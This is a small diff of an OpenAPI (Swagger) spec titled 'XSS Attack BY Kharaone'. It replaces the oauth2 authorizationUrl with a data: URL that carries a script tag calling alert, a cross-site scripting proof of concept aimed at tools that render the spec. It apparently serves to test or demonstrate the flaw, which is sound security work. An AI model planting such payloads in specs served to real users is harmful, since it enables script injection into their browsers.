@@ -4,7 +4,7 @@ securityDefinitions:
     type: basic
   a:
     type: oauth2
-    authorizationUrl: data:alert(document.domain)//
+    authorizationUrl: data:text/html,<script>alert(0)</script>
 info:
   title: XSS Attack BY Kharaone
   description: |
